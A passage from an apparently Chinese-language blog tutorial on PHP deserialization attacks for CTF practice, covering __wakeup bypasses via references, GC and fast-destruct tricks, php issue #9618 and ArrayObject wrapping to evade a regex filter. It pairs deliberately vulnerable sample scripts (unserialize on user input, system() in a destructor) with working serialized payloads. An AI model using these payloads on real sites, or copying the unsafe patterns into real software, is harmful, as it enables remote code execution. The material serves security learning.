class="line"></span><br></pre></td></tr></table></figure><p>若将<code>$this-&gt;wakeup</code>和<code>$this-&gt;key</code>引用关联起来，那么在<code>__destruct</code>里对<code>$this-&gt;key</code>修改时也会把<code>$this-&gt;wakeup</code>一起修改了，从而达成if语句的条件。</p><p>这里并没有绕过<code>wakeup</code>，<code>wakeup</code>正常执行了，只不过利用了引用的特点，使得<code>wakeup</code>里执行的操作对我们起不了作用。</p><p>pop：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;destruct&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key=False;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;wakeup)||!<span class="variable language_">$this</span>-&gt;wakeup)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You get it!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;wakeup&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;wakeup=True;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctf</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;key = &amp;<span class="variable">$a</span>-&gt;wakeup;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">// O:3:&quot;ctf&quot;:2:&#123;s:3:&quot;key&quot;;N;s:6:&quot;wakeup&quot;;R:2;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_2_2.png"></p><h2 id="PHP-GC回收机制"><a href="#PHP-GC回收机制" class="headerlink" title="PHP GC回收机制"></a>PHP GC回收机制</h2><h3 id="PHP-GC-回收机制是什么"><a href="#PHP-GC-回收机制是什么" class="headerlink" title="PHP GC 回收机制是什么"></a>PHP GC 回收机制是什么</h3><p>​在 PHP 中，是拥有垃圾回收机制 Garbage collection 的，也就是我们常说的 GC 机制的，在 PHP 中使用引用计数和回收周期来自动管理内存对象的，当一个变量被设置为 NULL ，或者没有任何指针指向时，它就会被变成垃圾，被 GC 机制自动回收掉；那么当一个对象没有了任何引用之后，就会被回收，在回收过程中，就会自动调用对象中的 <code>__destruct()</code> 方法。</p><ul><li>上面这一段话我个人认为如果零基础看，会感觉到相当抽象。所以我们先来解读一下</li></ul><p><strong>PHP 引用计数</strong></p><p>当我们 PHP 创建一个变量时，这个变量会被存储在一个名为 zval 的变量容器中。在这个 zval 变量容器中，不仅包含变量的类型和值，还包含两个字节的额外信息。</p><p>第一个字节名为 <code>is_ref</code>，是 bool 值，它用来标识这个变量是否是属于引用集合。PHP 引擎通过这个字节来区分普通变量和引用变量，由于 PHP 允许用户使用 <code>&amp;</code> 来使用自定义引用，zval 变量容器中还有一个内部引用计数机制，来优化内存使用。</p><p>第二个字节是 <code>refcount</code>，它用来表示指向 zval 变量容器的变量个数。所有的符号存储在一个符号表中，其中每个符号都有作用域。</p><p>接下来看看例子：</p><p>容器的生成：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;test&quot;</span>; </span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>(<span class="string">&#x27;a&#x27;</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里定义了一个变量 <code>$a</code>，生成了类型为 String 和值为 <code>test</code> 的变量容器，而对于两个额外的字节，<code>is_ref</code> 和 <code>refcount</code>，我们这里可以看到是不存在引用的，所以 <code>is_ref</code> 的值应该是 false，而 <code>refcount</code> 是表示变量个数的，那么这里就应该是1，验证一下。</p><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_3_1.png"></p><p>接下来添加一个引用</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;test&quot;</span>; </span><br><span class="line"><span class="variable">$b</span> = &amp;<span class="variable">$a</span>;</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>(<span class="string">&#x27;a&#x27;</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里的话 a 的 <code>refcount</code> 应该是 1，<code>is_ref</code> 应该是 true，验证一下</p><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_3_2.png"></p><p>结果不同于我们所想的，这是为什么呢？</p><p>因为同一变量容器被变量 a 和变量 b 关联，当没必要时，php 不会去复制已生成的变量容器。 所以这一个 <code>zval</code> 容器存储了 a 和 b 两个变量，就使得 <code>refcount</code> 的值为 2。</p><p>容器的销毁：</p><p>当函数执行结束或者对变量调用了 <code>unset()</code> 函数，refcount 就会减 1。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;test&quot;</span>; </span><br><span class="line"><span class="variable">$b</span> =&amp;<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span> =&amp;<span class="variable">$b</span>;</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$b</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_3_3.png"></p><h3 id="PHP-GC-回收机制攻击面"><a href="#PHP-GC-回收机制攻击面" class="headerlink" title="PHP GC 回收机制攻击面"></a>PHP GC 回收机制攻击面</h3><ul><li>原理：当 <code>is_ref</code> 减少时，会触发 <code>__destuct</code> 魔术方法，由此产生的一些 trick 类型攻击</li></ul><p>变量被<code>unset</code>函数处理：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$num</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$num</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;num = <span class="variable">$num</span>; </span><br><span class="line"><span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;num.<span class="string">&quot;__construct&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;num.<span class="string">&quot;__destruct()&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="number">2</span>); </span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="number">3</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_3_4.png"></p><p>当对象为<code>NULL</code>时也是可以触发<code>__destruct</code>的。</p><p>在一个 array 里面存在一个键值对，value 为某个类，当这个类为 NULL 的时候，会被认为是 <code>is_ref</code> 为 0，也就是 false。这就可以触发到 <code>__destruct</code> 方法</p><p>样例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;test_flag&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br></pre></td></tr></table></figure><p>这里因为有异常处理，所以正常情况下是无法<code>__destruct</code>，这时我们就需要利用GC回收机制来触发<code>__destruct</code>。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>=&gt;<span class="keyword">new</span> B,<span class="string">&#x27;b&#x27;</span>=&gt;<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">// a:2:&#123;s:1:&quot;a&quot;;O:1:&quot;B&quot;:0:&#123;&#125;s:1:&quot;b&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure><p>得到序列化文本如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;s:1:&quot;a&quot;;O:1:&quot;B&quot;:0:&#123;&#125;s:1:&quot;b&quot;;N;&#125;</span><br><span class="line">对象类型:对象个数:&#123;类型:长度:键名;类型:长度:类名:值类型:长度:键名;类型;&#125;</span><br><span class="line">数组:对象个数为2:&#123;str型:长度1:键名为&quot;a&quot;;类:长度为1:类名为&quot;B&quot;:值为0 str型:值为1:键名为&quot;b&quot;:NULL型;&#125;</span><br></pre></td></tr></table></figure><p>这时我们将键名<code>b</code>改成<code>a</code>，即在反序列化时，会下先让<code>a</code>赋值为类<code>B</code>，之后再将<code>a</code>赋值为<code>NULL</code>，但一开始<code>a</code>已经是对象了，赋值为<code>NULL</code>时就会出现对象为<code>NULL</code>的情况，从而触发<code>__destruct</code>。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;s:1:&quot;a&quot;;O:1:&quot;B&quot;:0:&#123;&#125;s:1:&quot;a&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_3_5.png"></p><p>这个是在反序列化中经常使用的方法。</p><h2 id="fast-destruct"><a href="#fast-destruct" class="headerlink" title="fast destruct"></a>fast destruct</h2><p>知识点：</p><p><em>1、PHP中，如果单独执行unserialize函数进行常规的反序列化，那么被反序列化后的整个对象的生命周期就仅限于这个函数执行的生命周期，当这个函数执行完毕，这个类就没了，在有析构函数的情况下就会执行它。</em></p><p><em>2、PHP中，如果用一个变量接住反序列化函数的返回值，那么被反序列化的对象其生命周期就会变长，由于它一直都存在于这个变量当中，那么在PHP脚本走完流程之后，这个对象才会被销毁，在有析构函数的情况下就会将其执行。</em></p><p>fast destruct 就是用来解决第二种情况带来的问题的。</p><p><strong>解法一</strong></p><p>当需要构造pop链的时候，反序列化后的对象被变量接住了，又要利用析构函数控制POP链的流程，这个时候就需要用到快速析构的技巧。</p><p>而且，大部分都是在类和类之间各有分工，在内部联系不是很紧密的情况下使用这种技巧。</p><p>使用索引相同的两个类，后一个类被反序列化时，前一个类会被销毁，从而调用析构函数（如果有的话）。</p><p>举例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$unser</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="keyword">array</span>(<span class="number">0</span> =&gt; <span class="keyword">new</span> <span class="title function_ invoke__">class1</span>(),<span class="number">1</span> =&gt; <span class="keyword">new</span> <span class="title function_ invoke__">class2</span>(),<span class="number">2</span> =&gt; <span class="keyword">new</span> <span class="title function_ invoke__">class3</span>(),<span class="number">1</span> =&gt; <span class="keyword">new</span> <span class="title function_ invoke__">class4</span>(),<span class="number">2</span> =&gt; <span class="keyword">new</span> <span class="title function_ invoke__">class5</span>()));</span><br><span class="line"><span class="variable">$target</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$unser</span>);</span><br></pre></td></tr></table></figure><p>那么整个流程如下:</p><p><em>class1被反序列化</em></p><p><em>class2被反序列化</em></p><p><em>class3被反序列化</em></p><p><em>class4被反序列化，class2被销毁</em></p><p><em>class5被反序列化，class3被销毁</em></p><p>注意，使用这种技巧得到的数组序列化字符串，其元素值必须依然是括号内元素的个数，只是对应的key要改一下。</p><p>“后一个类” 可以是一个无用的对象，包括数组。</p><p>其实就是一种GC回收机制。</p><p><strong>解法二</strong></p><p>在<code>unserialize</code>过程中扫描器发现序列化字符串格式有误导致的提前异常退出，为了销毁之前建立的对象内存空间，会立刻调用对象的<code>__destruct()</code>,提前触发反序列化链条。</p><p>这种情况只需要破坏原先的字符串格式即可，比如去掉最后的大括号，。</p><p>样例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;test_flag&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// O:1:&quot;B&quot;:0:&#123;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_4_1.png"></p><h2 id="php-issue-9618"><a href="#php-issue-9618" class="headerlink" title="php issue#9618"></a>php issue#9618</h2><p><a href="https://github.com/php/php-src/issues/9618">php issue#9618</a>提到了最新版wakeup()的一种bug，可以通过在反序列化后的字符串中包含字符串长度错误的变量名使反序列化在__wakeup之前调用__destruct()函数，最后绕过__wakeup()，版本：</p><ul><li>7.4.x -7.4.30</li><li>8.0.x</li></ul><p>样例（php 8.0.2）:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$info</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$end</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;info-&gt;<span class="title function_ invoke__">func</span>();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$znd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;znd = <span class="string">&quot;exit();&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__wakeup&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__call &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$info</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$end</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;__destruct&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;info-&gt;<span class="title function_ invoke__">func</span>(); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$znd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;znd = <span class="string">&quot;exit();&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__wakeup&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__call &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;info=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="comment">// O:1:&quot;A&quot;:2:&#123;s:4:&quot;info&quot;;O:1:&quot;B&quot;:1:&#123;s:3:&quot;znd&quot;;N;&#125;s:6:&quot;Aend&quot;;s:1:&quot;1&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_5_1.png"></p><p>很显然，<code>wakeup</code>在最后触发。</p><h2 id="使用C绕过"><a href="#使用C绕过" class="headerlink" title="使用C绕过"></a>使用C绕过</h2><p>众所周知可以使用C进行绕过wakeup，但这样有一个缺点，就是你把O改为C后是没办法有属性的，那假如需要用属性命令执行就不行了。</p><p>新方法是用原生类把原本的类打包一下，生成以C开头的payload。</p><p>这也是绕过<code>/^[Oa]:[/d]+/</code>过滤的方法之一。</p><p>样例（ctfshow 愚人杯3rd [easy_php]）：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;1+1&gt;2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[Oa]:[/d]+/i&quot;</span>, <span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctfshow</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$aa</span>=<span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$aa</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// C:11:&quot;ArrayObject&quot;:60:&#123;x:i:0;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:6:&quot;whoami&quot;;&#125;;m:a:0:&#123;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>实现了unserialize接口类的大概率是C打头，列出一些以C开头的原生类：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ArrayObject::unserialize</span><br><span class="line">ArrayIterator::unserialize</span><br><span class="line">RecursiveArrayIterator::unserialize</span><br><span class="line">SplDoublyLinkedList::unserialize</span><br><span class="line">SplQueue::unserialize</span><br><span class="line">SplStack::unserialize</span><br><span class="line">SplObjectStorage::unserialize</span><br></pre></td></tr></table></figure><p>需要注意，这种方法在序列化时对php版本有要求，用7.3.4才可以输出以C开头的payload，换7.4或者8.0输出的就是O开头了，但在<code>unserialize</code>时对php版本没要求。</p><h1 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h1><p>当 PHP 中序列化后的数据进行了长度替换之后，就可能存在这一漏洞，即通过修改输入数据从而控制整个序列化的内容。</p><p>反序列化知识：</p><ul><li>PHP 在反序列化时，底层代码是以 <code>;</code> 作为字段的分隔，以 <code>&#125;</code> 作为结尾（字符串除外）并且是根据长度判断内容的<ul><li>注意点，很容易以为序列化后的字符串是<code>;&#125;</code>结尾，实际上字符串序列化是以<code>;&#125;</code>结尾的，但对象序列化是直接<code>&#125;</code>结尾</li><li>php反序列化字符逃逸，就是通过这个结尾符实现的</li></ul></li><li>当长度不对应的时候会出现报错</li><li>反序列化的过程是有一定识别范围的，在这个范围之外的字符都会被忽略，不影响反序列化的正常进行</li></ul><h2 id="字符变多"><a href="#字符变多" class="headerlink" title="字符变多"></a>字符变多</h2><p>样例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$test1</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$test2</span>=<span class="string">&quot;hacker&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$test1</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;test1 = <span class="variable">$test1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;test2===<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;you get it!!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;test1&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$test1</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;yy&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span 